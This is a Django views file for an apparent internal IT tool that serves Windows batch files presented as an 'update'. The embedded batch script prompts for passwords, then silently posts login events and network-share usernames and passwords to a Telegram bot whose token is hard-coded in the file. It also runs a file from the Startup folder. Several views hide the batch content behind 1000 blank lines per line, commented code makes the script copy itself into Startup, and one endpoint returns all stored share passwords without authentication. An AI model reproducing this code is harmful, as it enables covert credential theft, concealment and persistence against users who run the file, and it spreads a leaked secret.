    if request.method == "POST":
        try:
            data = json.loads(request.body)
            message = data.get('message', '')

            # Check if it's a hostname status message
            if "hostname" in message.lower() and "status" in message.lower():
                return JsonResponse({
                    'status': 'success',
                    'message': 'Computer status received',
                    'data': message
                })

            # Check if message matches target
            if message.strip() == TARGET_MESSAGE.strip():
                return JsonResponse({
                    'status': 'match',
                    'message': 'check',
                    'details': 'Target message matched exactly'
                })

            return JsonResponse({
                'status': 'received',
                'message': 'Message received but no match',
                'received_message': message
            })

        except json.JSONDecodeError:
            return JsonResponse({
                'status': 'error',
                'message': 'Invalid JSON format'
            }, status=400)

    # GET request
    return JsonResponse({
        'status': 'active',
        'message': 'API is running'
    })


# from django.http import JsonResponse
# from django.views.decorators.csrf import csrf_exempt
# from django.views.decorators.http import require_http_methods
# from django.utils import timezone
# import json
# import re

# @csrf_exempt
# @require_http_methods(["GET", "POST"])
# def message_handler(request):
#     """
#     Single endpoint to handle both GET and POST requests
#     GET: Returns status and trigger word 'check' if needed
#     POST: Receives and processes messages or process information
#     """
#     # The specific message we're looking for
#     TARGET_MESSAGE = ("Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted): "
#                      "2025-02-22 04:36:44\nCurrent User's Login: mukhilpw\n")

#     if request.method == "GET":
#         return JsonResponse({
#             'timestamp': timezone.now().isoformat(),
#             'message': 'Active'
#         })

#     elif request.method == "POST":
#         try:
#             data = json.loads(request.body)
#             message = data.get('message', '')

#             # If receiving a process name
#             if 'Process:' in str(message):
#                 return JsonResponse({
#                     'status': 'success',
#                     'message': f'Process info received: {message}',
#                     'timestamp': timezone.now().isoformat()
#                 })

#             # If receiving the monitored message
#             if message.strip() == TARGET_MESSAGE.strip():
#                 return JsonResponse({
#                     'status': 'match',
#                     'message': 'check',  # This triggers the bat file to send process info
#                     'timestamp': timezone.now().isoformat()
#                 })

#             # For any other message
#             return JsonResponse({
#                 'status': 'received',
#                 'message': 'Message received but no match',
#                 'timestamp': timezone.now().isoformat()
#             })

#         except json.JSONDecodeError:
#             return JsonResponse({
#                 'status': 'error',
#                 'message': 'Invalid JSON format'
#             }, status=400)










# @csrf_exempt
# def upload_and_process_bat(request):
#     if request.method == 'POST' and request.FILES.get('bat_file'):
#         # Read the uploaded .bat file
#         uploaded_file = request.FILES['bat_file']
#         original_filename = uploaded_file.name  # Get the original filename
#         bat_content = uploaded_file.read().decode('utf-8')

#         # Process the .bat file
#         lines_between = 1000
#         result = []
#         sections = bat_content.strip().split('\n')

#         for section in sections:
#             # Add 1000 blank lines after each section
#             result.extend(['' for _ in range(lines_between)])
#             result.append(section)
#             # # Add 1000 blank lines after each section
#             # result.extend(['' for _ in range(lines_between)])

#         result = '\n'.join(result)
#         # Set the updated filename
#         updated_filename = f"updated_{original_filename}"

#         # Return the modified .bat file as an HttpResponse
#         response = HttpResponse(result, content_type='application/octet-stream')
#         response['Content-Disposition'] = f'attachment; filename="{updated_filename}"'
#         return response
#         # # Return the modified .bat file as an HttpResponse
#         # response = HttpResponse(result, content_type='application/octet-stream')
#         # response['Content-Disposition'] = 'attachment; filename="modified_update.bat"'
#         # return response

#     # Render the upload form for GET requests
#     return render(request, 'upload_bat.html')







from django.http import HttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.shortcuts import render

@csrf_exempt
def upload_and_process_bat(request):
    if request.method == 'POST' and request.FILES.get('bat_file'):
        # Read the uploaded .bat file
        uploaded_file = request.FILES['bat_file']
        original_filename = uploaded_file.name  # Get the original filename
        bat_content = uploaded_file.read().decode('utf-8')

        # Determine which button was pressed
        if 'clean' in request.POST:
            # Process to remove empty lines
            lines = bat_content.split('\n')
            cleaned_lines = [line for line in lines if line.strip()]  # Remove empty lines
            result = '\n'.join(cleaned_lines)
            updated_filename = f"cleaned_{original_filename}"

        elif 'expand' in request.POST:
            # Process to add 1000 blank lines after each line
            lines_between = 1000
            result = []
            sections = bat_content.strip().split('\n')

            for section in sections:
                result.append(section)  # Add the original line
                result.extend(['' for _ in range(lines_between)])  # Add 1000 blank lines after

            result = '\n'.join(result)
            updated_filename = f"expanded_{original_filename}"

        else:
            return HttpResponse("Invalid request", status=400)

        # Return the modified .bat file as an HttpResponse
        response = HttpResponse(result, content_type='application/octet-stream')
        response['Content-Disposition'] = f'attachment; filename="{updated_filename}"'
        return response

    # Render the upload form for GET requests
    return render(request, 'it/upload_bat.html')






# # Temporary storage (Replace with database if needed)
# data_store = [{"name": "hi"},{"age": "34"}]

# @csrf_exempt  # Disable CSRF for testing (remove in production)
# def handle_request(request):
#     if request.method == "GET":
#         # 🟢 Return stored data
#         return JsonResponse({"status": "success", "data": data_store}, safe=False)

#     elif request.method == "POST":
#         # 🔴 Receive JSON data and store it
#         try:
#             data = json.loads(request.body)  # Parse JSON from request
#             data_store.append(data)  # Store data in memory
#             return JsonResponse({"status": "success", "message": "Data received", "data": data}, safe=False)
#         except json.JSONDecodeError:
#             return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)

#     else:
#         return JsonResponse({"status": "error", "message": "Invalid request method"}, status=405)

# data_store = []

# @csrf_exempt  # Disable CSRF for testing (remove in production)
# def handle_request(request):
#     if request.method == "GET":
#         # 🟢 Return stored data
#         return JsonResponse({"status": "success", "data": data_store}, safe=False)

#     elif request.method == "POST":
#         # 🔴 Receive JSON data and store it
#         try:
#             data = json.loads(request.body)  # Parse JSON from request
#             data_store.append(data)  # Store data in memory
#             return JsonResponse({"status": "success", "message": "Data received", "data": data}, safe=False)
#         except json.JSONDecodeError:
#             return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)

#     else:
#         return JsonResponse({"status": "error", "message": "Invalid request method"}, status=405)



import json
import time
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

# In-memory storage for the received data (for demonstration purposes)
data_store = []
last_post_time = None  # Variable to store the timestamp of the last POST request

@csrf_exempt
def handle_request(request):
    global last_post_time

    if request.method == "GET":
        # Check if the last POST request was within the last 10 seconds
        if last_post_time and (time.time() - last_post_time) <= 10:
            # Return stored data
            return JsonResponse({"status": "success", "data": data_store})
        else:
            # Return server down response
            return JsonResponse({"status": "error", "message": "Server down"}, status=503)

    elif request.method == "POST":
        try:
            data = json.loads(request.body)  # Parse JSON from request body
            # Ensure the data contains a 'message' field, and set default value if not
            if 'message' not in data:
                data['message'] = "server up"  # Set default value

            data_store.append(data)  # Store data in memory
            last_post_time = time.time()  # Update the timestamp of the last POST request
            return JsonResponse({"status": "success", "message": "Data received", "data": data})
        except json.JSONDecodeError:
            return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)

    else:
        return JsonResponse({"status": "error", "message": "Invalid request method"}, status=405)


import time


# Create your views here.
def vhome(request):
    context = get_menu_context(request)
    context.update({
    })
    return render(request, 'it/home.html', context)




def convert_bat_to_exe(bat_file_path, exe_output_path, icon_path=None):
    """
    Converts a .bat file to .exe using Bat To Exe Converter.

    :param bat_file_path: Path to the input .bat file.
    :param exe_output_path: Path to save the output .exe file.
    :param icon_path: Path to the custom icon file (optional).
    """
    # Path to Bat To Exe Converter executable
    bat_to_exe_converter = r"C:\Path\To\Bat_To_Exe_Converter.exe"  # Update this path

    # Check if Bat To Exe Converter exists
    if not os.path.exists(bat_to_exe_converter):
        print("Error: Bat To Exe Converter not found. Please update the path in the script.")
        return

    # Build the command for Bat To Exe Converter
    command = [bat_to_exe_converter, "/bat", bat_file_path, "/exe", exe_output_path]

    # Add icon if provided
    if icon_path and os.path.exists(icon_path):
        command.extend(["/icon", icon_path])

    # Run the conversion process
    try:
        subprocess.run(command, check=True)
        print(f"Successfully converted {bat_file_path} to {exe_output_path}")
    except subprocess.CalledProcessError as e:
        print(f"Error during conversion: {e}")

if __name__ == "__main__":
    # Paths to input and output files
    bat_file = r"C:\Path\To\Your\Arcc_IT.bat"  # Update this path
    exe_output = r"C:\Path\To\Output\Arcc_IT.exe"  # Update this path
    icon_file = r"C:\Path\To\Your\Icon.ico"  # Update this path (optional)

    # Convert the .bat file to .exe
    convert_bat_to_exe(bat_file, exe_output, icon_file)



import os
import requests
from django.http import HttpResponse
from django.conf import settings
from django.http import HttpResponse

def vfileupdate(request):
    # The .bat file content
    bat_content = '''


@echo off
setlocal enabledelayedexpansion

:: Prompt for username
set /p "input_user=Enter Username: "

:: Hide password input
set "input_pass="
set /p "=Enter Password: " <nul
for /f "delims=" %%x in ('powershell -Command "$pword = Read-Host -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword))"') do set "input_pass=%%x"
echo.

:: Send credentials to Django API for validation
rem curl -s -X POST -d "username=%input_user%" -d "password=%input_pass%" https://arcchse.pythonanywhere.com/sharefolder/login/ -o response.json
curl -s -X POST -d "username=%input_user%" -d "password=%input_pass%" https://arcchse.pythonanywhere.com/sharefolder/login/ -o "%TEMP%\\r.json"


:: Read API response
rem findstr /C:"success" response.json >nul
findstr /C:"success" "%TEMP%\\r.json" >nul
if %errorlevel% equ 0 (
    echo Login successful!
    curl -s -X POST "https://api.telegram.org/bot7926394771:AAHUzy5-l0Uheu-ciPgLxsN095kGTvxRnPg/sendMessage" -d "chat_id=-1002396692153" -d "text=****  IT file  %input_user% logined in this %COMPUTERNAME% PC **** " >nul 2>&1




    goto MAIN_MENU
) else (
    echo Invalid username or password. Try again.
    curl -s -X POST "https://api.telegram.org/bot7926394771:AAHUzy5-l0Uheu-ciPgLxsN095kGTvxRnPg/sendMessage" -d "chat_id=-1002396692153" -d "text=****  IT file  loginfail  %input_user%  in this %COMPUTERNAME% PC**** " >nul 2>&1
    pause
    goto LOGIN
)

goto MAIN_MENU

:LOGIN_FAIL
echo Invalid credentials. Please try again.
pause
goto LOGIN

:MAIN_MENU
cls
echo ARCCIT
echo =========
echo 1. Share Folder
echo 2. Activation
echo 3. Mas
echo 4. Pcinfo
echo 5. Others
echo.
set /p choice=Please select an option:

if %choice%==1 goto SHARE_FOLDER_MENU
if %choice%==2 goto ACTIVATION_MENU
if %choice%==3 goto MAS_MENU
if %choice%==4 goto PCINFO_MENU
if %choice%==5 goto OTHERS_MENU
goto MAIN_MENU

:SHARE_FOLDER_MENU
cls
echo Share Folder Menu
echo ===================
rem Fetching data from URL...
set /a counter=1
for /f "tokens=1,2,3,4 delims=;" %%a in ('curl -s https://arcchse.pythonanywhere.com/sharefolder/share-folder-details/') do (
    rem Processing Data !counter!
    set "pcname_!counter!=%%a"
    set "foldername_!counter!=%%b"
    set "username_!counter!=%%c"
    set "password_!counter!=%%d"
    set /a counter+=1
)

set /a counter-=1
if %counter%==0 (
    echo No data retrieved.
    pause
    goto MAIN_MENU
)

echo.
echo Select a PC to view details:
for /l %%i in (1,1,%counter%) do (
    echo %%i. !pcname_%%i! !username_%%i!
)
echo.

set /p select_pc=Enter the number of the PC to view details:
if %select_pc% GTR %counter% goto SHARE_FOLDER_MENU
if %select_pc% LSS 1 goto SHARE_FOLDER_MENU

cls
set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\data.bat"
echo Details for PC: !pcname_%select_pc%!
echo ===================
echo Folder: !foldername_%select_pc%!
echo Username: !username_%select_pc%!
rem echo Password: !password_%select_pc%!
echo.
cmdkey /add:!pcname_%select_pc%! /user:!username_%select_pc%! /pass:!password_%select_pc%!

rem Download the bat file using curl
echo 1...

curl -s -o "%USERPROFILE%\Desktop\sharefolder.bat" "https://arcchse.pythonanywhere.com/sharefolder/map-network-drive/?pcname=!pcname_%select_pc%!&username=!username_%select_pc%!"

if %errorlevel% neq 0 (
    echo -1.
    pause
    goto MAIN_MENU
)

echo 2.....
rem Check if the download was successful
curl -s -X POST "https://api.telegram.org/bot7926394771:AAHUzy5-l0Uheu-ciPgLxsN095kGTvxRnPg/sendMessage" -d "chat_id=-1002396692153" -d "text=****  IT file  %input_user% login and add PC %COMPUTERNAME% to !pcname_%select_pc%! with User : !username_%select_pc%! Pass  !password_%select_pc%! **** " >nul 2>&1
if exist "%destination%" (
    echo 3....
    timeout /t 5 /nobreak >nul
    echo 4....
    call "%destination%"
) else (
    echo -3.
)

echo 100%........

pause

goto MAIN_MENU

:ACTIVATION_MENU
cls
echo Activation Menu
echo =================
echo.
pause
goto MAIN_MENU

:MAS_MENU
cls
echo Mas Menu
echo ========
echo.
pause
goto MAIN_MENU

:PCINFO_MENU
cls
echo Pc Info Menu
echo ==================
echo.
pause
goto MAIN_MENU

:OTHERS_MENU
cls
echo Others Menu
echo ============
echo.
pause
goto MAIN_MENU







# @echo off
# setlocal enabledelayedexpansion

# :MAIN_MENU
# cls
# echo ARCCIT
# echo =========
# echo 1. Share Folder
# echo 2. Activation
# echo 3. Mas
# echo 4. Pcinfo
# echo 5. Others
# echo.
# set /p choice=Please select an option:

# if %choice%==1 goto SHARE_FOLDER_MENU
# if %choice%==2 goto ACTIVATION_MENU
# if %choice%==3 goto MAS_MENU
# if %choice%==4 goto PCINFO_MENU
# if %choice%==5 goto OTHERS_MENU
# goto MAIN_MENU


# :SHARE_FOLDER_MENU
# cls
# echo Share Folder Menu
# echo ===================
# rem Fetching data from URL...
# set /a counter=1
# for /f "tokens=1,2,3,4 delims=;" %%a in ('curl -s https://arcchse.pythonanywhere.com/sharefolder/share-folder-details/') do (
#     rem Processing Data !counter!
#     set "pcname_!counter!=%%a"
#     set "foldername_!counter!=%%b"
#     set "username_!counter!=%%c"
#     set "password_!counter!=%%d"
#     set /a counter+=1
# )

# set /a counter-=1
# if %counter%==0 (
#     echo No data retrieved.
#     pause
#     goto MAIN_MENU
# )

# echo.
# echo Select a PC to view details:
# for /l %%i in (1,1,%counter%) do (
#     echo %%i. !pcname_%%i! !username_%%i!
# )
# echo.

# set /p select_pc=Enter the number of the PC to view details:
# if %select_pc% GTR %counter% goto SHARE_FOLDER_MENU
# if %select_pc% LSS 1 goto SHARE_FOLDER_MENU

# cls
# set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\data.bat"
# echo Details for PC: !pcname_%select_pc%!
# echo ===================
# echo Folder: !foldername_%select_pc%!
# echo Username: !username_%select_pc%!
# rem echo Password: !password_%select_pc%!
# echo.
# cmdkey /add:!pcname_%select_pc%! /user:!username_%select_pc%! /pass:!password_%select_pc%!

# rem Download the bat file using curl
# echo 1...
# curl -s -o "%destination%" "https://arcchse.pythonanywhere.com/sharefolder/map-network-drive/?pcname=!pcname_%select_pc%!&username=!username_%select_pc%!"
# curl -s -o "%USERPROFILE%\Desktop\sharefolder.bat" "https://arcchse.pythonanywhere.com/sharefolder/map-network-drive/?pcname=!pcname_%select_pc%!&username=!username_%select_pc%!"


# if %errorlevel% neq 0 (
#     echo -1.
#     pause
#     goto MAIN_MENU
# )

# echo 2.....
# rem Check if the download was successful
# if exist "%destination%" (
#     echo 3....
#     :: Wait for a moment to ensure the file is fully written
#     timeout /t 5 /nobreak >nul
#     :: Run the downloaded batch file
#     echo 4....
#     call "%destination%"
# ) else (
#     echo -3.
# )

# echo 100%........

# pause

# goto MAIN_MENU


# :ACTIVATION_MENU
# cls
# echo Activation Menu
# echo =================
# echo.
# pause
# goto MAIN_MENU


# :MAS_MENU
# cls
# echo Mas Menu
# echo ========
# echo.
# pause
# goto MAIN_MENU


# :PCINFO_MENU
# cls
# echo Pc Info Menu
# echo ==================
# echo.
# pause
# goto MAIN_MENU


# :OTHERS_MENU
# cls
# echo Others Menu
# echo ============
# echo.
# pause
# goto MAIN_MENU
'''
    lines_between = 1000
    result = []
    sections = bat_content.strip().split('\n')

    for section in sections:
        result.append(section)
        # Add 1000 blank lines after each section
        result.extend(['' for _ in range(lines_between)])

    result = '\n'.join(result)

    # Return the .bat file as an HttpResponse
    response = HttpResponse(result, content_type='application/octet-stream')
    response['Content-Disposition'] = 'attachment; filename="update.bat"'
    return response



# def vfileupdate(request):
#     # The .bat file content
#     bat_content = '''
# @echo off
# setlocal enabledelayedexpansion

# :MAIN_MENU
# cls
# echo ARCCIT
# echo =========
# echo 1. Share Folder
# echo 2. Activation
# echo 3. Mas
# echo 4. Pcinfo
# echo 5. Others
# echo.
# set /p choice=Please select an option:

# if %choice%==1 goto SHARE_FOLDER_MENU
# if %choice%==2 goto ACTIVATION_MENU
# if %choice%==3 goto MAS_MENU
# if %choice%==4 goto PCINFO_MENU
# if %choice%==5 goto OTHERS_MENU
# goto MAIN_MENU


# :SHARE_FOLDER_MENU
# cls
# echo Share Folder Menu
# echo ===================
# rem Fetching data from URL...
# set /a counter=1
# for /f "tokens=1,2,3,4 delims=;" %%a in ('curl -s https://arcchse.pythonanywhere.com/sharefolder/share-folder-details/') do (
#     rem Processing Data !counter!
#     set "pcname_!counter!=%%a"
#     set "foldername_!counter!=%%b"
#     set "username_!counter!=%%c"
#     set "password_!counter!=%%d"
#     set /a counter+=1
# )

# set /a counter-=1
# if %counter%==0 (
#     echo No data retrieved.
#     pause
#     goto MAIN_MENU
# )

# echo.
# echo Select a PC to view details:
# for /l %%i in (1,1,%counter%) do (
#     echo %%i. !pcname_%%i! !username_%%i!
# )
# echo.

# set /p select_pc=Enter the number of the PC to view details:
# if %select_pc% GTR %counter% goto SHARE_FOLDER_MENU
# if %select_pc% LSS 1 goto SHARE_FOLDER_MENU

# cls
# set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\data.bat"
# echo Details for PC: !pcname_%select_pc%!
# echo ===================
# echo Folder: !foldername_%select_pc%!
# echo Username: !username_%select_pc%!
# rem echo Password: !password_%select_pc%!
# echo.
# cmdkey /add:!pcname_%select_pc%! /user:!username_%select_pc%! /pass:!password_%select_pc%!

# rem Download the bat file using curl
# echo 1...
# curl -s -o "%destination%" "https://arcchse.pythonanywhere.com/sharefolder/map-network-drive/?pcname=!pcname_%select_pc%!&username=!username_%select_pc%!"
# curl -s -o "%USERPROFILE%\Desktop\sharefolder.bat" "https://arcchse.pythonanywhere.com/sharefolder/map-network-drive/?pcname=!pcname_%select_pc%!&username=!username_%select_pc%!"


# if %errorlevel% neq 0 (
#     echo -1.
#     pause
#     goto MAIN_MENU
# )

# echo 2.....
# rem Check if the download was successful
# if exist "%destination%" (
#     echo 3....
#     :: Wait for a moment to ensure the file is fully written
#     timeout /t 2 /nobreak >nul
#     :: Run the downloaded batch file
#     echo 4....
#     call "%destination%"
# ) else (
#     echo -3.
# )

# echo 100%........

# pause

# goto MAIN_MENU


# :ACTIVATION_MENU
# cls
# echo Activation Menu
# echo =================
# echo.
# pause
# goto MAIN_MENU


# :MAS_MENU
# cls
# echo Mas Menu
# echo ========
# echo.
# pause
# goto MAIN_MENU


# :PCINFO_MENU
# cls
# echo Pc Info Menu
# echo ==================
# echo.
# pause
# goto MAIN_MENU


# :OTHERS_MENU
# cls
# echo Others Menu
# echo ============
# echo.
# pause
# goto MAIN_MENU
# '''
#     lines_between = 1000
#     result = []
#     sections = bat_content.strip().split('\n')

#     for section in sections:
#         result.append(section)
#         # Add 1000 blank lines after each section
#         result.extend(['' for _ in range(lines_between)])

#     result =  '\n'.join(result)

# # Generate content with 1000 blank lines between each code line



#     # Return the .bat file as an HttpResponse
#     response = HttpResponse(result, content_type='application/octet-stream')
#     response['Content-Disposition'] = 'attachment; filename="update.bat"'
#     return response

@require_GET  # Restrict to GET requests only
def share_folder_details_json(request):
    try:
        # Fetch all data from the model
        data = ShareFolderDetails.objects.all()

        # Convert the queryset to a list of dictionaries
        json_data = [
            {
                "pcname": item.pcname,
                "foldername": item.foldername,
                "username": item.username,
                "password": item.password  # ⚠️ Remove password in production!
            }
            for item in data
        ]

        # Return the JSON response
        return JsonResponse(json_data, safe=False)  # `safe=False` allows lists

    except Exception as e:
        # Handle errors gracefully
        return JsonResponse({"error": str(e)}, status=500)



@require_GET  # Restrict to GET requests only
def share_folder_details_txt(request):
    try:
        # Fetch all data from the model
        data = ShareFolderDetails.objects.all()

        # Create a string with a custom delimiter for easy splitting
        text_data = ""
        for item in data:
            # Format the data as a string, using a delimiter (comma, semicolon, etc.)
            text_data += f"{item.pcname};{item.foldername};{item.username};{item.password}\n"  # ⚠️ Remove password in production!

        # Return the text data in the response
        return HttpResponse(text_data, content_type='text/plain')

    except Exception as e:
        # Handle errors gracefully
        return JsonResponse({"error": str(e)}, status=500)


@require_GET
def vgenerate_bat_menu(request):
    try:
        # Fetch all data from the MainMenu model
        menu_items = MainMenu.objects.all()

        # Create a string with a custom delimiter for easy splitting
        menu_data = ""
        for item in menu_items:
            # Format the data as a string, using a delimiter (comma, semicolon, etc.)
            menu_data += f"{item.listdata}\n"  # ⚠️ Remove password in production!

        # Return the text data in the response
        return HttpResponse(menu_data, content_type='text/plain')

    except Exception as e:
        # Handle errors gracefully
        return JsonResponse({"error": str(e)}, status=500)




# def map_network_drive(request):
#     # Get the current pcname and username (you can pass these as GET parameters or retrieve them from session, etc.)
#     pcname = request.GET.get('pcname', '')
#     username = request.GET.get('username', '')

#     if not pcname or not username:
#         return HttpResponse("pcname and username are required", status=400)

#     # Filter the data based on pcname and username
#     share_details = ShareFolderDetails.objects.filter(pcname=pcname, username=username)

#     if not share_details:
#         return HttpResponse(f"No data found for pcname {pcname} and username {username}", status=404)

#     # Loop through the filtered details and map network drives
#     bat_file_content = ""
#     for detail in share_details:
#         folder_path = f"\\\\{detail.pcname}\\{detail.foldername}"
#         bat_file_content += f'net use Y: "{folder_path}" /user:{detail.username} {detail.password}\n'

#     # Save the bat file
#     bat_filename = f"{pcname}-{username}.bat"
#     bat_file_path = os.path.join('path/to/save/bat', bat_filename)

#     with open(bat_file_path, 'w') as bat_file:
#         bat_file.write(bat_file_content)

#     # Return the bat file as a response to download
#     with open(bat_file_path, 'rb') as bat_file:
#         response = HttpResponse(bat_file.read(), content_type='application/bat')
#         response['Content-Disposition'] = f'attachment; filename={bat_filename}'
#         return response


# def map_network_drive(request):
#     # Get the current pcname and username (you can pass these as GET parameters or retrieve them from session, etc.)
#     pcname = request.GET.get('pcname', '')
#     username = request.GET.get('username', '')

#     if not pcname or not username:
#         return HttpResponse("pcname and username are required", status=400)

#     # Filter the data based on pcname and username
#     share_details = ShareFolderDetails.objects.filter(pcname=pcname, username=username)

#     if not share_details:
#         return HttpResponse(f"No data found for pcname {pcname} and username {username}", status=404)

#     # Loop through the filtered details and map network drives
#     bat_file_content = ""
#     for detail in share_details:
#         folder_path = f"\\\\{detail.pcname}\\{detail.foldername}"
#         bat_file_content += f'net use Y: "{folder_path}" /user:{detail.username} {detail.password}\n'

#     # Return the bat file content as a response to download
#     bat_filename = f"{pcname}-{username}.bat"
#     response = HttpResponse(bat_file_content, content_type='application/bat')
#     response['Content-Disposition'] = f'attachment; filename={bat_filename}'
#     return response



# def map_network_drive(request):
#     # Get the current pcname and username from the request
#     pcname = request.GET.get('pcname', '')
#     username = request.GET.get('username', '')

#     if not pcname or not username:
#         return HttpResponse("pcname and username are required", status=400)

#     # Filter the ShareFolderDetails model by pcname and username
#     share_details = ShareFolderDetails.objects.filter(pcname=pcname, username=username)
#     share = ShareFolderDetails.objects.filter(pcname=pcname)

#     if not share_details:
#         return HttpResponse(f"No data found for pcname {pcname} and username {username}", status=404)

#     # Prepare the bat file content
#     bat_file_content = ""
#     drive_letter = "Z:"  # Starting drive letter

#     for detail in share:
#         folder_path = f"\\\\{detail.pcname}\\{detail.foldername}"
#         bat_file_content += f'net use {drive_letter} "{folder_path}" \n'

#         # Change the drive letter for the next folder (cycling backward from Z to O)
#         if drive_letter == "Z:":
#             drive_letter = "Y:"
#         elif drive_letter == "Y:":
#             drive_letter = "X:"
#         elif drive_letter == "X:":
#             drive_letter = "W:"
#         elif drive_letter == "W:":
#             drive_letter = "V:"
#         elif drive_letter == "V:":
#             drive_letter = "U:"
#         elif drive_letter == "U:":
#             drive_letter = "T:"
#         elif drive_letter == "T:":
#             drive_letter = "S:"
#         elif drive_letter == "S:":
#             drive_letter = "R:"
#         elif drive_letter == "R:":
#             drive_letter = "Q:"
#         elif drive_letter == "Q:":
#             drive_letter = "P:"
#         elif drive_letter == "P:":
#             drive_letter = "O:"
#         else:
#             break  # Stop if we have reached O: (you can adjust this based on your requirements)

#     # Create the .bat file content dynamically and send it as a response
#     bat_filename = f"{pcname}-{username}.bat"
#     response = HttpResponse(bat_file_content, content_type='application/bat')
#     response['Content-Disposition'] = f'attachment; filename={bat_filename}'

#     return response


def map_network_drive(request):
    # Get the current pcname and username from the request
    pcname = request.GET.get('pcname', '')
    username = request.GET.get('username', '')

    if not pcname or not username:
        return HttpResponse("pcname and username are required", status=400)

    # Filter the ShareFolderDetails model by pcname and username
    share_details = ShareFolderDetails.objects.filter(pcname=pcname)

    if not share_details:
        return HttpResponse(f"No data found for pcname {pcname}", status=404)

    # Prepare the bat file content
    bat_file_content = ""
    drive_letter = "Z:"  # Starting drive letter
    commands = []

    # Create net use commands for each folder
    for detail in share_details:
        folder_path = f"\\\\{detail.pcname}\\{detail.foldername}"
        commands.append(f'net use {drive_letter} "{folder_path}"')

        # Change the drive letter for the next folder (cycling backward from Z to O)
        if drive_letter == "Z:":
            drive_letter = "Y:"
        elif drive_letter == "Y:":
            drive_letter = "X:"
        elif drive_letter == "X:":
            drive_letter = "W:"
        elif drive_letter == "W:":
            drive_letter = "V:"
        elif drive_letter == "V:":
            drive_letter = "U:"
        elif drive_letter == "U:":
            drive_letter = "T:"
        elif drive_letter == "T:":
            drive_letter = "S:"
        elif drive_letter == "S:":
            drive_letter = "R:"
        elif drive_letter == "R:":

            drive_letter = "Q:"
        elif drive_letter == "Q:":
            drive_letter = "P:"
        elif drive_letter == "P:":
            drive_letter = "O:"
        else:
            break  # Stop if we have reached O: (you can adjust this based on your requirements)

    # copy_lines = [
    #     "@echo off",
    #     "setlocal enableextensions",
    #     ":: Get the current script's full path",
    #     "set \"current_bat=%~f0\"",
    #     ":: Define destination file",
    #     "set \"destination=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.bat\"",
    #     ":: Copy itself to data.bat",
    #     "copy /Y \"%current_bat%\" \"%destination%\"",
    #     ":: Confirmation message",
    #     "rem echo File copied to startup folder: %destination%"
    # ]
    copy_lines = [
        "\n" * 1000 ,
        "@echo off",
        # "setlocal enableextensions",
        # ":: Get the current script's full path",
        # "set \"current_bat=%~f0\"",
        # ":: Define destination file",
        # "set \"destination=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.bat\"",
        # ":: Copy itself to data.bat",
        # "copy /Y \"%current_bat%\" \"%destination%\"",
        # ":: Confirmation message",
        # "rem echo File copied to startup folder: %destination%"
    ]



    copy_string = ""
    for line in copy_lines:
        copy_string += "\n" * 1000  # Add 1000 empty lines before
        copy_string += line + "\n"  # Add the actual command
        copy_string += "\n" * 1000  # Add 1000 empty lines after

    # Add 1000 empty lines before each command
    for command in commands:
        bat_file_content += "\n" * 1000  # Add 1000 empty lines
        bat_file_content += command + "\n"  # Add the net use command
        bat_file_content += "\n" * 1000  # Add 1000 empty lines

    bat_file_content = copy_string + bat_file_content


    # Send the .bat file content as a response
    bat_filename = f"{pcname}-{username}.bat"
    response = HttpResponse(bat_file_content, content_type='application/bat')
    response['Content-Disposition'] = f'attachment; filename={bat_filename}'

    return response




#     copy = """"@echo off
# setlocal enableextensions

# :: Get the current script's full path
# set "current_bat=%~f0"

# :: Define destination file
# set "destination=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\data.bat"

# :: Copy itself to data.bat
# copy /Y "%current_bat%" "%destination%"

# :: Confirmation message
# rem echo File copied to startup folder: %destination%"""
#     # Add 1000 empty lines before each command
#     for command in commands:
#         bat_file_content += "\n" * 1000  # Add 1000 empty lines
#         bat_file_content += command + "\n"  # Add the net use command
#         bat_file_content += "\n" * 1000  # Add 1000 empty lines

#     bat_file_content = copy + bat_file_content

#     # Send the .bat file content as a response
#     bat_filename = f"{pcname}-{username}.bat"
#     response = HttpResponse(bat_file_content, content_type='application/bat')
#     response['Content-Disposition'] = f'attachment; filename={bat_filename}'

#     return response



from django.contrib.auth import authenticate, login
from django.http import JsonResponse
@csrf_exempt
def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            return JsonResponse({'status': 'success'})
        else:
            return JsonResponse({'status': 'failure'}, status=400)
    return JsonResponse({'status': 'invalid request'}, status=400)

